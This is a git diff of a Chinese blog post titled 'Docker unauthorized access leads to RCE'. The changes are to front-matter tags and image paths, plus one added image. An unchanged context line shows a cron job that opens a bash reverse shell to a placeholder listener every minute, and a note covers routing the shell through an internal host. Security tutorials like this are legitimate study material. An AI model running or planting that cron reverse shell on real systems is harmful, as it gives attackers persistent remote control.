@@ -2,9 +2,9 @@
 title: docker未授权致RCE
 date: 2025-02-04
 tags:
-  - PEN
+  - SEC
 draft: false
-images: ['/static/images/blog/2025/mou.webp']
+images: ['/static/images/blog/2025/docker-unauthorized/Pasted%20image%2020250409140309.png']
 authors: ['default']
 ---
 
@@ -94,3 +94,5 @@ echo "*/1  *  *  *  *   bash -c 'bash -i >& /dev/tcp/<IPonListening>/10341 0>&1'
 ```
 
 注意，目标服务器可能出不了网，只能反弹 shell 到内网，需要有一台内网机器，可以之后再由内网机器配置转发到外网。
+
+![](/static/images/blog/2025/docker-unauthorized/Pasted%20image%2020250409140309.png)
